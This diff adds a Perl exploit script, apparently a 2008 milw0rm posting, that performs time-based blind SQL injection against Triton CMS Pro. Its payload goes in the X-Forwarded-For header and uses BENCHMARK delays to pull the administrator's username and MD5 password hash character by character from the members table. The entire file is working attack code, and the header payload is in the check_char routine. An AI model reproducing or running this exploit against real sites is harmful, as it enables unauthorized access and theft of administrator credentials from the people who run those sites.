@@ -1,0 +1,122 @@
+#!/usr/bin/perl -w
+#Triton CMS Pro (X-Forwarded-For) Blind SQL Injection
+#Admin's username/hash disclosure exploit
+#Benchmark() method, so take a coffee and relax
+#Coded by __GiReX__
+
+use LWP::UserAgent;
+use HTTP::Request;
+
+if(not defined $ARGV[0])
+{
+	print "\nUsage: perl $0 [host] [path] [1/2]\n";
+	print "Example: perl $0 localhost /tcms/\n";
+	exit;
+}
+
+my $host  = ($ARGV[0] =~ /^http:\/\//) ?  $ARGV[0]:  'http://' . $ARGV[0];
+   $host .=  $ARGV[1] unless not defined $ARGV[1];
+
+my $client =  new LWP::UserAgent;
+my $get    =  new HTTP::Request('GET', $host);
+my @cset   =  (97..122, 0);               # Only  a-z  charset for username exploit if need change it
+my @cset2  =  (48..57, 97..102); 
+my $prefix =  "tc_";         
+
+my ($i, $j) = (0, 1);
+my ($user, $hash) = (undef, undef);
+
+banner();
+
+while($i != $#cset)
+{  
+   for($i = 0; $i <= $#cset; $i++)
+   {
+    my ($pre_time, $post_time) = time();	
+	
+	info(chr($cset[$i]), "Username", $user);
+	$rv = check_char($cset[$i], $j, "username");
+	$post_time = time();	
+	
+	 if($post_time - $pre_time > 3 and $rv)
+	 {
+		$user .= chr($cset[$i]); 
+		last;
+	 }
+   }
+
+  $j++;
+}
+
+if(not defined $user)
+{
+     print STDOUT "\n\n[-] Exploit mistake: please check the benchmark and expected time\n\n";
+	 exit;
+}
+else
+{
+     print STDOUT "\n[+] Admin Hashed Pass: \r";
+}
+
+for($j = 0; $j <= 32; $j++)
+{  
+    for($i = 0; $i <= $#cset2; $i++)
+    {
+     $pre_time = time();	
+	
+	 info(chr($cset2[$i]), "Hashed Pass", $hash);
+	 $rv = check_char($cset2[$i], $j, "password");
+	 $post_time = time();	
+	
+         if($post_time - $pre_time > 3 and $rv)
+	     {
+	         $hash .= chr($cset2[$i]);
+	         last;
+	     }
+    }
+}
+
+if(not defined $hash or length($hash) != 32)
+{
+     print STDOUT "\n\n[-] Exploit mistake: please check the benchmark expected time\n\n";
+}
+else 
+{
+     print STDOUT "\n\n[+] Exploit terminated\n\n";
+}
+
+
+sub banner
+{
+   print "\n";
+   print "[+] Triton CMS Pro (X-Forwarded-For) Blind SQL Injection\n";
+   print "[+] Admin's username/hash disclosure exploit\n";
+   print "[+] Coded by __GiReX__\n";
+   print "\n";
+}
+
+sub info
+{
+  my($c, $str, $cur)  =  @_;
+	
+	$cur = '' unless defined $cur;
+	print  STDOUT "[+] Admin ${str}: ${cur}${c}\r";
+	
+ $| = 1; 
+}
+
+sub check_char
+{
+  my ($char, $n, $field)  =  @_ ;
+   
+    $get->header('X-Forwarded-For' =>  "-1' AND ".
+			     "CASE WHEN (SELECT ASCII(SUBSTRING(${field}, ${n}, 1)) ".
+			     "FROM ${prefix}members WHERE id=1)=${char} ".
+                 "THEN benchmark(99000000, CHAR(0)) END#"); 
+
+    $res = $client->request($get);
+    
+  return $res->is_success;
+}
+
+# milw0rm.com [2008-07-07]
